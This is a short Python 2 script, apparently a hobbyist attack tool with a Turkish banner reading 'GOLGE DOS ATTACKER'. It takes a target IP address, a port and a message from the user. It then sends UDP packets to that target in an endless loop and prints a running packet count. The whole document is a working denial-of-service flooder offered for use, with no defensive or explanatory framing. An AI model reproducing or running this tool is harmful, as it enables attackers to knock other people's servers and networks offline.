import socket
import random
import os
#bu tool duzenlenmistir.KODLAYICILAR: ZEZERON VE XIORXA asaf pici(hic yardimci olmadi)
os.system("clear")
banner= """
####################################
########GOLGE DOS ATTACKER##########
########CODER BY ZEZERON############
########---AND XIORXA---############
####################################
"""
print(banner)
hedef_ip =raw_input('HEDEF IP: ')
port =input('PORT: ')
mesaj = raw_input('MESAJINIZ :')
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sayac = 0
while True:
    sock.connect((hedef_ip,port))
    sock.sendto(mesaj,(hedef_ip,port))
    sayac += 1
    print "HEDEF : %s HEDEF PORT : %s MESAJINIZ %s PAKET SAYISI : %s"%(hedef_ip,port,mesaj,sayac)